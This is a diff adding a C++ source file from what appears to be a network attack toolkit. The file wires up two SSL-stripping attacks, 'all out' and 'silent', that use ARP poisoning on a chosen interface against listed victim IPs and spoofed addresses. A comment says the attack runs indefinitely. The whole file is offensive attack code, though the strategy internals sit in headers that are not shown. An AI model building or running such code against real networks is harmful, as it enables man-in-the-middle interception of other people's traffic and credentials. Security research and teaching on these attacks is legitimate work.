@@ -1,0 +1,80 @@
+#include "ssl_stripping/public.h"
+#include "IpAddress.h"
+#include "MacAddress.h"
+#include "PcapLiveDevice.h"
+#include "PcapLiveDeviceList.h"
+#include "ssl_stripping/all_out.h"
+#include "ssl_stripping/silent.h"
+#include <memory>
+#include <stdexcept>
+#include <string>
+#include <utility>
+
+/**
+ * In the current implementation this method will not terminate and keep
+ * peforming the attack.
+ */
+void ATK::SSL::allOutStrip(const AllOutStrippingOptions &options) {
+    pcpp::PcapLiveDevice *device =
+        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
+            options.ifaceIpOrName);
+
+    if (device == nullptr) {
+        throw std::invalid_argument(options.ifaceIpOrName +
+                                    " is not a valid interface");
+    }
+
+    ATK::SSL::AllOutSslStrippingStrategy::Builder builder(device);
+
+    if (options.attackerMac.has_value()) {
+        const pcpp::MacAddress macAddress(options.attackerMac.value());
+        builder = builder.attackerMac(macAddress);
+    }
+
+    std::unique_ptr<ATK::SSL::AllOutSslStrippingStrategy> strategy =
+        builder.build();
+
+    SslStrippingContext arpPoisoningContext(std::move(strategy));
+
+    arpPoisoningContext.execute();
+}
+
+void ATK::SSL::silentStrip(const SilentStrippingOptions &options) {
+    pcpp::PcapLiveDevice *device =
+        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
+            options.ifaceIpOrName);
+
+    if (device == nullptr) {
+        throw std::invalid_argument(options.ifaceIpOrName +
+                                    " is not a valid interface");
+    }
+
+    for (const std::string &ipToSpoofStr : options.ipsToSpoof) {
+
+        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
+    }
+
+    ATK::SSL::SilentSslStrippingStrategy::Builder builder(device);
+
+    if (options.attackerMac.has_value()) {
+        const pcpp::MacAddress macAddress(options.attackerMac.value());
+        builder = builder.attackerMac(macAddress);
+    }
+
+    for (const std::string &victimIpStr : options.victimIps) {
+        const pcpp::IPv4Address victimIp(victimIpStr);
+        builder.addVictimIp(victimIp);
+    }
+
+    for (const std::string &ipToSpoofStr : options.ipsToSpoof) {
+        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
+        builder = builder.addIpToSpoof(ipToSpoof);
+    }
+
+    std::unique_ptr<ATK::SSL::SilentSslStrippingStrategy> strategy =
+        builder.build();
+
+    SslStrippingContext arpPoisoningContext(std::move(strategy));
+
+    arpPoisoningContext.execute();
+}
